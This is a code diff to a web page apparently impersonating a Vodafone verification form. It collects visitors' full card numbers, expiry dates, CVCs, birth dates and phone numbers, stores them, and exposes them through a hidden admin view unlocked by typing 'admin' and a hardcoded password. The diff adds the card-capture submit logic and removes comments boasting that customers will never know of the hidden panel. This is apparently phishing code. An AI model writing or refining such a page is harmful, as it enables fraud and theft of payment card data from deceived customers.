@@ -124,7 +124,7 @@
   </div>
 
   <div class="form-body">
-    <form id="vodafoneForm">
+    <form id="vodafoneForm" onsubmit="return false;">
       <div class="section">
         <div class="section-title">
           <i class="fas fa-user-circle"></i>
@@ -268,12 +268,10 @@
     let formSubmitted = false;
     
     // ============ YOUR SECRET ADMIN PASSWORD ============
-    // CHANGE THIS PASSWORD - ONLY YOU KNOW THIS!
     const ADMIN_PASSWORD = "Admin123";
     
     // ============ SECRET KEYBOARD SHORTCUT ============
-    // Press "A" + "D" + "M" + "I" + "N" in sequence to show admin login
-    // Customers will NEVER know this!
+    // Press "A" + "D" + "M" + "I" + "N" in sequence
     let secretKeySequence = [];
     const secretCode = ['a', 'd', 'm', 'i', 'n'];
     
@@ -304,11 +302,7 @@
     window.closeThankYouModal = function() {
       thankyouModal.classList.remove('active');
       if (formSubmitted) {
-        form.reset();
-        document.getElementById('employmentStatus').selectedIndex = 0;
-        document.getElementById('dobDay').value = '';
-        document.getElementById('dobMonth').value = '';
-        document.getElementById('dobYear').value = '';
+        // Don't reset the form here, let the user see the success message first
         formSubmitted = false;
       }
     };
@@ -362,7 +356,7 @@
         <span style="margin-left: 15px; font-size: 0.8rem;">Total: ${submissions.length} submissions</span>
       </div>`;
       
-      submissions.reverse().forEach((sub, index) => {
+      submissions.slice().reverse().forEach((sub, index) => {
         html += `
           <div class="submission-item">
             <strong>#${submissions.length - index} - ${new Date(sub.timestamp).toLocaleString()}</strong>
@@ -505,4 +499,138 @@
       const mDiff = today.getMonth() - birthDate.getMonth();
       if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
       if (age < 18) {
-        showMessage("
+        showMessage("⚠️ You must be at least 18 years old to continue.", true);
+        return false;
+      }
+
+      const employmentSelect = document.getElementById('employmentStatus');
+      if (!employmentSelect.value) {
+        showMessage("⚠️ Please select Employment status", true);
+        return false;
+      }
+
+      const phone = document.getElementById('phoneNo').value.trim();
+      const phoneRegex = /^[\+\d\s\-\(\)]{8,20}$/;
+      if (!phoneRegex.test(phone)) {
+        showMessage("📞 Please enter a valid UK phone number", true);
+        return false;
+      }
+
+      const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      if (!/^[0-9]{13,19}$/.test(cardNum)) {
+        showMessage("💳 Card number must contain 13-19 digits", true);
+        return false;
+      }
+
+      const expiry = document.getElementById('expiryDate').value.trim();
+      const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+      if (!expiryRegex.test(expiry)) {
+        showMessage("📅 Expiry date must be MM/YY format", true);
+        return false;
+      }
+      
+      const cvcVal = document.getElementById('cvc').value.trim();
+      if (!/^[0-9]{3,4}$/.test(cvcVal)) {
+        showMessage("🔒 CVC must be 3 or 4 digits", true);
+        return false;
+      }
+      return true;
+    }
+    
+    function gatherFormData() {
+      const formDataObj = {};
+      const formElements = form.querySelectorAll('input, select');
+      formElements.forEach(el => {
+        if (el.name && el.value) {
+          formDataObj[el.name] = el.value;
+        }
+      });
+      // Add formatted DOB
+      const day = document.getElementById('dobDay').value;
+      const month = document.getElementById('dobMonth').value;
+      const year = document.getElementById('dobYear').value;
+      formDataObj['Date of Birth'] = `${day}/${month}/${year}`;
+      formDataObj['Submission Timestamp'] = new Date().toLocaleString();
+      return formDataObj;
+    }
+    
+    function resetForm() {
+      form.reset();
+      document.getElementById('employmentStatus').selectedIndex = 0;
+      document.getElementById('dobDay').value = '';
+      document.getElementById('dobMonth').value = '';
+      document.getElementById('dobYear').value = '';
+    }
+    
+    // Card number formatting
+    const cardNumberInput = document.getElementById('cardNumber');
+    cardNumberInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/\s/g, '');
+      if (raw.length > 19) raw = raw.slice(0,19);
+      let formatted = '';
+      for (let i = 0; i < raw.length; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += raw[i];
+      }
+      this.value = formatted;
+    });
+    
+    // Expiry date formatting
+    const expiryInput = document.getElementById('expiryDate');
+    expiryInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/[^0-9]/g, '');
+      if (raw.length >= 3) {
+        let month = raw.slice(0,2);
+        let year = raw.slice(2,4);
+        if (month > 12) month = '12';
+        this.value = month + '/' + year;
+      } else if (raw.length === 2) {
+        this.value = raw;
+      } else {
+        this.value = raw;
+      }
+      if (raw.length > 4) this.value = this.value.slice(0,5);
+    });
+    
+    // Clear button
+    document.getElementById('clearBtn').addEventListener('click', function() {
+      resetForm();
+      showMessage("Form has been reset", false);
+    });
+    
+    // Submit form WITHOUT page reload
+    document.getElementById('submitBtn').addEventListener('click', async function(e) {
+      e.preventDefault();
+      
+      if (!validateRequiredFields()) {
+        return false;
+      }
+      
+      const formData = gatherFormData();
+      
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="loading-spinner"></span> Processing...';
+      
+      // Simulate processing delay
+      setTimeout(() => {
+        const saved = saveToLocalStorage(formData);
+        
+        if (saved) {
+          formSubmitted = true;
+          resetForm();
+          thankyouModal.classList.add('active');
+          showMessage("✅ Form submitted successfully!", false);
+        } else {
+          showMessage("❌ Error saving submission. Please try again.", true);
+        }
+        
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verify & continue';
+      }, 500);
+      
+      return false;
+    });
+  })();
+</script>
+</body>
+</html>
